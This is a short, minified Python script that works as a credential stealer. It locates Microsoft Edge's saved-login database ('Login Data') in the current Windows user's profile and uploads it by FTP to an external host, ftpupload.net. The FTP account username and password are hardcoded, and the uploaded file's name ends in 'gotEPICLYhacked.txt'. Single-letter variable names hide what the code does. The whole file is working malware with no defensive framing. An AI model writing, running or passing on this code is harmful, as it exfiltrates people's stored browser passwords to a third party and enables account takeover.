import os
from ftplib import FTP
A=os.getenv('USERNAME')
B='ftpupload.net'
C='epiz_34226190'
D='QKHSeRxBzD'
E='/htdocs/fu/'
F='C:\\Users\\'+A+'\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data'
def G(local_path,remote_dir,filename):
	try:
		A=FTP(B);A.login(C,D);A.cwd(remote_dir)
		with open(local_path,'rb')as E:A.storbinary(f"STOR {filename}",E)
		A.quit()
	except Exception as F:print(f"Error: {F}")
if __name__=='__main__':G(F,E,A+'gotEPICLYhacked.txt')
